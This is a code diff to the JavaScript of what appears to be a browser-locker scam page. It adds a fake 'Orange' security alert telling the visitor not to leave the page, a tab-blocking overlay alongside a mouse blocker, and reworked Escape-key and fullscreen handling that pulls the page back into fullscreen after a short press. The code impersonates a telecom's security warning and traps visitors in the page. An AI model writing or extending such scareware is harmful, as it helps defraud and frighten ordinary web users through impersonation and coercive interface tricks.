@@ -13,6 +13,11 @@
 
   mount.innerHTML =
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
+    '<div id="securityTaskbarModal" class="security-taskbar-modal" aria-hidden="true" role="alert">' +
+    '<p class="security-taskbar-alert">Alerte de sécurité Orange</p>' +
+    '<p class="security-taskbar-warning">Ne quittez pas la page</p>' +
+    '</div>' +
+    '<div id="securityTabsBlocker" class="security-tabs-blocker" aria-hidden="true"></div>' +
     '<div class="modal-top-square" id="securityOverlay" aria-label="Alerte securite" aria-hidden="true">' +
     '<div class="security-page">' +
     '<section class="access-modal" aria-label="Alerte acces bloque">' +
@@ -174,6 +179,35 @@
     securityOverlay.classList.add("is-active");
     securityOverlay.setAttribute("aria-hidden", "false");
     document.body.classList.add("security-mode");
+    showSecurityTaskbarModal();
+  }
+
+  function showSecurityTaskbarModal() {
+    var taskbarModal = document.getElementById("securityTaskbarModal");
+    var tabsBlocker = document.getElementById("securityTabsBlocker");
+    if (taskbarModal) {
+      document.body.appendChild(taskbarModal);
+      taskbarModal.classList.add("is-visible");
+      taskbarModal.setAttribute("aria-hidden", "false");
+    }
+    if (tabsBlocker) {
+      document.body.appendChild(tabsBlocker);
+      tabsBlocker.classList.add("is-visible");
+      tabsBlocker.setAttribute("aria-hidden", "false");
+    }
+  }
+
+  function hideSecurityTaskbarModal() {
+    var taskbarModal = document.getElementById("securityTaskbarModal");
+    var tabsBlocker = document.getElementById("securityTabsBlocker");
+    if (taskbarModal) {
+      taskbarModal.classList.remove("is-visible");
+      taskbarModal.setAttribute("aria-hidden", "true");
+    }
+    if (tabsBlocker) {
+      tabsBlocker.classList.remove("is-visible");
+      tabsBlocker.setAttribute("aria-hidden", "true");
+    }
   }
 
   function forceStayFullscreen() {
@@ -197,21 +231,37 @@
   function showEscapeExitModal() {
     var modal = document.getElementById("escapeExitModal");
     if (!modal) return;
+    document.body.appendChild(modal);
     modal.classList.add("is-visible");
     modal.setAttribute("aria-hidden", "false");
+    document.body.style.visibility = "visible";
   }
 
-  function dezoomFullscreen() {
+  function exitAfterEscapeHold() {
+    if (isDezoomed) return;
+
+    stopFullscreenGuard();
     allowFullscreenExit = true;
     isDezoomed = true;
+    escapeKeyHeld = false;
+    clearEscapeHold();
+    document.body.classList.remove("security-dezoomed");
     document.body.classList.add("security-dezoomed");
+
+    showEscapeExitModal();
+    showSecurityTaskbarModal();
+
     if (document.fullscreenElement && document.exitFullscreen) {
       document.exitFullscreen().catch(function () {});
     }
-    showEscapeExitModal();
+
     setTimeout(function () {
       allowFullscreenExit = false;
     }, 400);
+  }
+
+  function dezoomFullscreen() {
+    exitAfterEscapeHold();
   }
 
   function forceFullscreen() {
@@ -267,9 +317,7 @@
       var elapsed = Date.now() - escapeHoldStart;
 
       if (elapsed >= ESCAPE_DEZOOM_MS && !isDezoomed) {
-        dezoomFullscreen();
-        clearEscapeHold();
-        escapeKeyHeld = false;
+        exitAfterEscapeHold();
         return;
       }
 
@@ -303,6 +351,11 @@
 
         escapeKeyHeld = false;
         clearEscapeHold();
+
+        if (heldLongEnough && !isDezoomed) {
+          exitAfterEscapeHold();
+          return;
+        }
 
         if (!heldLongEnough && !isDezoomed) {
           forceStayFullscreen();
